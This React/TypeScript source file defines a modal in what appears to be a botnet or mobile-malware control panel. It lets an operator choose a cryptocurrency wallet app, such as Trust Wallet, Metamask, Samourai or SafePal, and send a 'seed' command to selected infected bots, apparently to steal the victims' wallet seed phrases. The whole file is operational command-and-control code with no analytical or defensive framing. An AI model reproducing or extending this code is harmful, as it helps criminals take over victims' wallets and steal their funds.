import React from "react";
import {Col, Form, Modal, Radio, Row} from "antd";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {getBotsId} from "../../../Util/getBotIds";
import sendCommand from "../../../Requests/Commands/sendCommands";
import {useTranslation} from "react-i18next";

const GetSeedPhrase: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps) => {
    const [form] = Form.useForm();

    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };

    const formSubmit = () => {
        sendCommand({
            command: form.getFieldValue("seed"),
            payload: [],
            botIds: getBotsId(props.selectedBots),
        });

        closeModal();
    };

    const {t} = useTranslation();

    return (
        <Modal
            title={t("GET_SEED_COMMAND")}
            open={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            okText={t("GET_SEED_COMMAND")}
            cancelText={t("MODAL_BUTTON_CANCEL")}
            width={340}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item label={t("LOG_COLUMN_SEED") + ":"} name="seed" initialValue="trust">
                    <Radio.Group>
                        <Row>
                            <Col span={12}>
                                <Radio value="trust">Trust wallet</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="bitcoincom">Bitcoin.com</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="mycelium">MyCelium</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="piuk">BlockChain</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="samourai">Samourai</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="toshi">Toshi</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="metamask">Metamask</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="safepal">SafePal</Radio>
                            </Col>
                        </Row>
                    </Radio.Group>
                </Form.Item>
            </Form>
        </Modal>
    );
};

export default GetSeedPhrase;
